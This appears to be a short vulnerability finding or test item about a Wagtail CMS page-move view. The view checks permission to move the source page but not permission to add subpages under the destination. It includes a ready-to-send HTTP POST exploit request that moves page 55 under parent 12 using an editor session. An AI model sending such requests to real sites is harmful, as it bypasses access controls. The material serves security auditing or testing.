diagnosis: The view checks whether request.user can move the source page (can_move()), but fails to check whether request.user has permission to add subpages to the destination (target_parent.permissions_for_user(request.user).can_add_subpage()). This allows moving pages into restricted or top-level corporate sections without write permissions.
exploit_request:
POST /cms-custom/pages/55/move/ HTTP/1.1
Host: wagtail.example.com
Cookie: sessionid=editor_session
Content-Type: application/x-www-form-urlencoded

target_parent_id=12
